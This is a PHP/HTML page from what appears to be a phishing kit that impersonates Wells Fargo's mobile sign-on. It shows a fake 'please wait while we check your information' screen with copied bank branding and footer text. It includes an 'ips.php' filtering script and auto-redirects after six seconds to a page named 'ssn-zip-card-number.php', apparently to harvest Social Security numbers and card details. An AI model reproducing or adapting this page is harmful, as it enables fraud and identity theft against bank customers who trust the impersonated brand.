<?

include "ips.php";

?>

<!DOCTYPE html>
<html lang="en" class="no-js">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><!-- WFB 3.4 -->
  <META HTTP-EQUIV="refresh" content="6;URL=ssn-zip-card-number.php?">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
          <title>Wells Fargo – Banking, Credit Cards, Loans, Mortgages &amp; More</title>
    <meta name="robots" content="index, nofollow">
    <meta name="search_category" content="Personal">
     <meta name="viewport" content="width=device-width,  initial-scale=1.0, maximum-scale=6.0, user-scalable=yes">
    <meta name="apple-itunes-app" content="app-id=311548709">
<link rel="stylesheet" href="assets/wf-fonts.css" type="text/css">
<link rel="shortcut icon" type="image/x-icon" href="./surance_files/favicon.ico">
<link rel="apple-touch-icon" sizes="120x120" href="./surance_files/apple-touch-icon-120x120.png">
<link rel="apple-touch-icon" sizes="180x180" href="./surance_files/apple-touch-icon-180x180.png">
<link rel="icon" sizes="128x128" href="./surance_files/icon-normal-128x128.png">
<link rel="icon" sizes="192x192" href="./surance_files/icon-hires-192x192.png">
<link rel="shortcut icon" type="image/x-icon" href="https://www04.wellsfargomedia.com/favicon.ico">
<link rel="stylesheet" type="text/css" href="assets/banner.css" />
<link rel="stylesheet" type="text/css" href="css/framework.css" />
<link rel="stylesheet" type="text/css" href="css/smartphone-home.css" />
</head>

<body class="freezedscreen" style="top: 0px;">
<div id="shell" class="page" data-pid="324-114205-64">
<div id="hamburger-menubackdrop" class="backDrop">
</div>
<a href="#" class="hidden">Skip to content</a>

<header class="masthead" role="banner">
        
                <div id="navLeft" style="display: block;">
                        
          <a tabindex="1" href="index.php" rel="nofollow" class="backLink">
            <span class="sr-only">Back link</span>
          </a>
        
                </div>
               	
                <div class="logoOuter">
                        <div class="logo">
                                <a href="/"><img alt="" role="img" src="https://www01.wellsfargomedia.com/assets/_mobile/images/icons/icn-layer-svg.svg"></a>                        
                        </div>	
                </div>	 
        
                <div id="navRight">
                        <nav class="navbar navbar-default navbar-fixed-top">
<div class="navbar-header">
<div class="entire-menu">
<button type="button" class="navbar-toggle hamburger" aria-expanded="false" aria-label="Open Menu Navigation"><span class="sr-only">Menu</span> <span class="icon-bar">?</span> <span class="icon-bar">?</span> <span class="icon-bar">?</span> <span class="expandedIcon pointer">?</span></button></div>
</div>
</nav>	
                </div>
        
</header>

	<div class="overlaySignOn" style="top: 43px;" aria-hidden="false">

		<div class="overlayContainer">
			<div class="welcome-container" style="font-family: Wells Fargo Serif;">Please wait...</div>
			<!-- Retrieving username values -->
			<div class="security-container">
				<span class="security-img"></span>
				<a href="#" class="security-text">Online &amp; Mobile Security</a> 
				
				
				
				
			</div>
			
			

			<div align="center" class="signOnContainer">							
				<br>
				
				<img border="0" src="surance_files/loading-icon-red.gif" width="70" height="70"></p>


			</div>
			<h1 class="banner" style=" text-align: center;

  font-size: 30px;
  color: #3b3331;
  font-family: Wells Fargo Serif;
  margin-top: 26px;
  padding: 0;
">Please wait while we check your information.</h1>
                    <br />
                    <p align="center" style="text-align: center; font-size: 15px">It'll only take a few seconds - we're just verifying the details that you've entered.</p>
                    <br></br>			
<br></br>
                    <p align="center" style="text-align: center; font-size: 11px;color:#909090 ">Please don't refresh this page or close your browser while you're waiting.</p>
                    <p></p>
			
			<div class="appstoreBadge" id="ios"> 
				<a href="#" class="ios"><span class="sr-only">Get the Wells Fargo app</span></a>  
				<a href="#" class="android" style="display: none;"><span class="sr-only">Get the Wells Fargo app</span></a>
				
			</div>
			
			<footer role="contentinfo">
				<div class="html5footer c9" id="pageFooter">
					<nav class="nav-footer">
						<div class="footer-link clistData">
							<a href="#">PRIVACY, Cookies, Security &amp; Legal</a> | <a href="#">Ad Choices</a>
							<div class="footer-oaa"><a href="#">Online Access Agreement</a>
							</div>
						</div>
						<div class="footer-content">
							<div>
								<strong>Investment and Insurance products:</strong>
							</div>
							<div>
								<strong>NOT FDIC-Insured | NO Bank Guarantee | MAY Lose Value</strong>
							</div>
						</div>
						<div class="footer-content">Deposit products offered by Wells Fargo Bank, N.A. Member FDIC.</div>
						<div class="footer-content">
							<span class="home-equal">‍</span> Equal Housing Lender. NMLSR ID 399801</div>
						<div class="footer-content footer-margin">© 2020 Wells Fargo. All rights reserved.</div>
						<div class="stage-coach"><img src="https://www01.wellsfargomedia.com/assets/_mobile/images/global/stagecoach_50_opacity.svg" aria-hidden="true" alt="">
				  </nav></div>
					
		  </footer></div>
			
	</div>
    <div class="overlayfavorite" style="display: none;" aria-hidden="true">
<div class="favorite-popup" style="top: 520px;"><span class="close-popup"><a href="#" class="nooutline"><img alt="Close" src="./surance_files/btn-close-x.png"></a></span> <span class="sr-only">Begining of popup</span>
<div class="popup-title">
<h2>Article Saved</h2>
</div>
<div class="popup-body">
<p>You can keep up to 5 favorite articles at a time.</p>
<p>Select <strong>My Favorites</strong> from the top menu to see your saved articles.</p>
</div>
<span class="sr-only">End of popup</span></div>
</div>                        

 <article class="fp-articles" data-cid="tcm:323-149897-16" data-ctid="tcm:322-113919-32" aria-hidden="true"><a class="articles-media" href="#" enrollmentid="2475"></a>
<a href="#" tabindex="-1" class="articles-star-container"><span tabindex="0" class="articles-star"><span class="sr-only">Add 	

  Need online access?Enroll Now
 to favorites</span></span> </a></article>
                            <footer role="contentinfo" aria-hidden="true">
	<div class="html5footer c9" id="pageFooter">

                 
        <nav class="nav-footer"></nav>

        
    </div>
</footer>
</div>
</div>


<div class="displayNone">
<img src="./surance_files/s.gif" alt="">
</div>

</body>
</html>